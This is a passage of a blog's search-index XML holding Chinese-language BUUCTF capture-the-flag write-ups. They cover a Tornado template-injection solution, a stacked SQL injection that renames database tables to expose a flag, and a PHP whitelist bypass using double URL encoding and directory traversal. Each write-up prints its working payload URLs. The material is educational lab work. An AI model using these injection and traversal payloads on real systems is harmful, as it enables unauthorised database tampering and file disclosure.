keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>    cookie_secret<span class="token operator">=</span><span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>最后的filehash为</p><pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre><p>然后构造payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre><p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 强网杯-随便注</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p><a id="more"></a><p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p><p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>纯数字需要用反引号括起来<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p><p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre><p>注：这里要注意几个问题：</p><pre><code>对列名进行更改时，要在后面指定修改后的数据类型添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> 修改表名和列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-warmup/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>代码审计题目<br>查看源代码，发现提示</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--source.php--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问source.php</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> </code></pre><p>代码审计<br>有一个checkFile方法，规定了白名单</p><pre class=" language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>白名单内有一个hint.php，访问一下</p><pre class=" language-bash"><code class="language-bash">flag not here, and flag <span class="token keyword">in</span> ffffllllaaaagggg</code></pre><p>得到这样的提示，再继续审计代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>需要设定page参数并且page要是字符</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>mb_substr是截取字符串的函数，mb_strpos函数则找出字符第一次出现的地方<br>所以上面代码的作用就是，截取page到？第一次出现的地方</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>如果截取之后的_page在白名单内则返回真<br>第一次截取之后再对page进行一次url解码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>解码之后在对其进行同样的截取操作<br>同样的，如果截取到的_page在白名单内则返回真</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  </code></pre><p>这一块代码的含义是，如果我们设定了file参数，并且满足file参数是字符串和checkfile方法，就进行文件包含，否则就返回一开始我们见到的那个滑稽<br>审计完了代码，我们需要理清思路<br>1.flag在ffffllllaaaagggg里面<br>2.我们的file要有白名单内的文件<br>3.两次解码(服务器本身就会进行一次url解码，后端又进行一次解码)后依然要满足checkfile方法<br>基于这些要求，我们就能够造出payload</p><pre class=" language-bash"><code class="language-bash">http://2bd8af98-1fcf-46ca-9780-c09e216ffb5e.node3.buuoj.cn/?file<span class="token operator">=</span>source.php%253f<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/ffffllllaaaagggg</code></pre><p>?经过两次url编码之后是%253f，后面的../是用来进行目录穿越的<br>访问一下就能得到flag<br>flag{540b1ff4-daf1-472a-8d21-0a0c9a36884b} </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/LawlietLW.github.io/about/index.html"/>
      <url>/LawlietLW.github.io/about/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/LawlietLW.github.io/categories/index.html"/>
      <url>/LawlietLW.github.io/categories/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/LawlietLW.github.io/categories/index-1.html"/>
      <url>/LawlietLW.github.io/categories/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index-1.html"/>
      <url>/LawlietLW.github.io/tags/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>contact</title>
      <link href="/LawlietLW.github.io/contact/index.html"/>
      <url>/LawlietLW.github.io/contact/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index.html"/>
      <url>/LawlietLW.github.io/tags/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
  
</search>
